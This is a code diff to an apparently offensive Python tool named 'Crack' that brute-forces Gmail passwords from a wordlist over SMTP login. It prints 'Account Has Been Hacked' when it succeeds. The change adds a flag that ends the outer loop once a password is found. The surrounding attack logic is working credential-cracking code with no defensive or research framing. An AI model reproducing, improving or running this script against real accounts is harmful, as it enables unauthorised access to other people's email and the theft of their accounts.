@@ -29,6 +29,7 @@ class Crack():
         self.passFile = file
         self.passlist = []
         self.server = None
+        self.hacked = False
 
     def openFile(self):
         if os.path.exists(self.passFile):
@@ -64,11 +65,13 @@ class Crack():
                     print("Attempt " + str(i))
                     self.server.login(self.gmail, password)
                     print("Account Has Been Hacked, Password : " + password)
+                    self.hacked = True
                     break
                 except Exception as e:
                     error = str(e)
                     if "Application-specific password required" in error:
                         print("Account Has Been Hacked, Password : " + password + " (Has Authentication)")
+                        self.hacked = True
                         break
                     elif "Username and Password not accepted" in error:
                         print("password not found => " + password)
@@ -77,6 +80,8 @@ class Crack():
                         print(e)
                         self.connect(True)
                         continue
+            if self.hacked:
+                break
 
 
 
